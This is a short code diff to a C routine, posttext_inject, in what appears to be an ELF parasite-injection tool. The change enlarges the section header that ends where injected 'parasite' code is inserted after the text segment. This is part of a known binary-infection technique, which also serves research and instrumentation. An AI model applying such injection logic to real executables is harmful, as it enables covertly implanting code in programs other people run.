@@ -74,6 +74,10 @@ uint32_t posttext_inject(Elfit_t *host, char *parasite, uint32_t patch_position)
     shdr = (Elf32_Shdr *) (host->mem + ehdr->e_shoff);
     for (i = ehdr->e_shnum; i-- > 0; shdr++)
     {
+        if (shdr->sh_offset + shdr->sh_size == (text_offset + entry_offset))
+        {
+            shdr->sh_size += psize;
+        }
         if (shdr->sh_offset >= (text_offset + entry_offset))
         {
             shdr->sh_offset += PAGE_SIZE;
